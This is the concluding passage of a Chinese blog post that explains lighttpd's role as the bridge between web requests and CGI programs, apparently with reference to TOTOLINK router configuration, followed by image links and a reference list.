![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668737933437-40031a4f-01fd-4104-a838-9a2e8359cbd2.png)

## ⑤、总结
一张图就能总结：

> + [https://blog.csdn.net/lenky0401/article/details/4201713](https://blog.csdn.net/lenky0401/article/details/4201713?spm=1001.2014.3001.5501)
>

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668487697342-a6aed664-7794-4dfb-ab1e-01f11bd4d07d.png)

+ **<font style="color:#E8323C;">无论是直接请求网页还是直接请求cgi，流量都要通过中间件lighttpd，也就是说lighttpd起着“桥梁”的作用。</font>**

# 5、附
1. `lighttpd.conf`各个配置项的含义请参考：[https://wiki.archlinux.org/title/Lighttpd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)](https://wiki.archlinux.org/title/Lighttpd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87))
2. 下面两张图是TOTOLINK的lighttpd.conf的配置情况：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668410074657-90adad48-3798-4ad5-97a7-86c2b23ae589.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668410036701-bc3f74a6-d783-4754-a00c-3f937f93617e.png)

3. 父进程等待子进程退出：[https://blog.csdn.net/anmo_moan/article/details/123563556](https://blog.csdn.net/anmo_moan/article/details/123563556)

# 6、参考资料
[从疑问中窥探Linux终端](https://www.yuque.com/cyberangel/yal5fc/vb3bgr)

[PWN进阶（1-6）-初探调用one_gadget的约束条件(execve)](https://www.yuque.com/cyberangel/rg9gdm/gbyagk)

[计算机操作系统实验知识点（NYIST）](https://www.yuque.com/cyberangel/rg9gdm/rimvzk)

+ [https://www.yanxurui.cc/posts/server/2017-01-04-write-a-cgi-program-in-c-language](https://www.yanxurui.cc/posts/server/2017-01-04-write-a-cgi-program-in-c-language)（用c语言编写cgi脚本）
+ [https://www.cnblogs.com/beacer/archive/2012/09/16/2687889.html](https://www.cnblogs.com/beacer/archive/2012/09/16/2687889.html)
+ [https://www.cnblogs.com/wanghetao/p/3934350.html](https://www.cnblogs.com/wanghetao/p/3934350.html)



